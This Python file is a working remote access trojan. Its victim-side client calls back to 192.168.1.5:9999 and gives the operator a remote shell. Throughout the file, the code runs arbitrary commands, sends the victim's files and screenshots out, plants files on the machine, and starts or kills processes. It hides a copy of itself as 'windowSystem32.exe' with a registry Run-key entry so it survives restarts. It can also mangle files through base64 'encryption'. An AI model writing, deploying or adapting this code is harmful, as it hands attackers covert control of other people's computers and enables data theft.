#!/usr/bin/python3
import os,sys
import subprocess
import socket
import time
import base64
import pyautogui

class Vic():
    def __init__(self,ip,port):
        self.ip = ip
        self.port = port
        self.__connect__()
        self.__main__()

    def __connect__(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        try:    
            self.s.connect((self.ip,self.port))
        
        except:
            time.sleep(2)
            self.__connect__()


    def persistence(self):
        try:
            path = os.environ["APPDATA"] + "\\windowSystem32.exe"
            f = open(sys.executable,"rb")
            f2 = open(path,"wb")
            f2.write(f.read())
            f.close()
            f2.close()
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Syst3m32 /t REG_SZ /d '+path+'',shell=True)
            self.s.send(b"[+] Persistenced!")

        except Exception as e:
            f = f"[-] {str(e)[str(e).find(']')+2:]}"
            f = f.encode()
            self.s.send(f)
    
    def simple_encrypt(self,f_name):
            try:
                f = open(f_name,"rb")
                fde = base64.b64encode(f.read())
                f.close()
                os.remove(f_name)
                f2 = open(f_name,"wb")
                f2.write(fde)
                f2.close()
                self.s.send(b"[+]File Encrypted.")
            except:
                self.s.send(b"[-]File Error.")

    def simple_decrypt(self,f_name):
            try:
                f = open(f_name,"rb")
                fdd = base64.b64decode(f.read())
                f.close()
                os.remove(f_name)
                f2 = open(f_name,"wb")
                f2.write(fdd)
                f2.close()
                self.s.send(b"[+]File Decrypted.")
            except:
                self.s.send(b"[-]File Error.")

    def download_file(self,f_name):
        try:
            f = open(f_name,'wb')
        except:
            f = open("TMPfailled",'wb')
        chunk = self.s.recv(1024)
        self.s.settimeout(2)
        while(chunk):
            f.write(chunk)
            try:
                chunk = self.s.recv(1024)
            except TimeoutError:
                break
        self.s.settimeout(None)

    
    def upload_file(self,f_name):
        try:
            f = open(f_name,'rb')
            self.s.send(f.read())
            f.close()
        except Exception as e:
            f = f"[-] {str(e)[str(e).find(']')+2:]}"
            f = f.encode()
            self.s.send(f)

    def screenShot(self,f_name):
        if len(f_name) == 0:
            f_name = "TMP_PiC.png"
        myScreenshot = pyautogui.screenshot()
        myScreenshot.save(f_name)
        self.upload_file(f_name)
        os.remove(f_name)
        
    def __main__(self):
        
        while(1):
            cmd = self.s.recv(1024).decode()
            if(cmd[:2] == "cd"):
                try:
                    os.chdir(cmd[3:])
                    self.s.send(b"[+]Directory Changed.")
                
                except Exception as e:
                    data = str(e).encode()
                    self.s.send(data)

            elif (cmd == "quit!"):
                    self.s.close()
                    sys.exit(0)

            elif (cmd == "persistance!"):
                self.persistence()

            elif (cmd[:3] == "ss!"):
                self.screenShot(cmd[4:])
                
            elif (cmd[:4] == "run!"):
                try:
                    prog = subprocess.Popen([cmd[5:]])
                    data = f"[+]Executed On {prog.pid}"
                    self.s.send(data.encode())
                except:
                    self.s.send(b"[-]Error.COMMOND")
            
            elif (cmd[:5] == "kill!"):
                try:
                    os.kill(int(cmd[6:]),1)
                    self.s.send(b"[+]Executed.")
                except:
                    self.s.send(b"[-]Error.Process")
            
            elif (cmd[:9] == "download!"):
                    self.upload_file(cmd[10:])
                    

            elif (cmd[:7] == "upload!"):
                    self.download_file(cmd[8:])
                    

            elif (cmd[:8] == "encrypt!"):
                    self.simple_encrypt(cmd[9:])
            
            elif (cmd[:8] == "decrypt!"):
                    self.simple_decrypt(cmd[9:])

            else:
                    execute = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
                    data = execute.stdout.read() + execute.stderr.read()
                    if(len(data) == 0 ):
                           self.s.send(b"[+]Executed.")
                    
                    else:
                           self.s.send(data)
                
                           

Vic("192.168.1.5",9999)
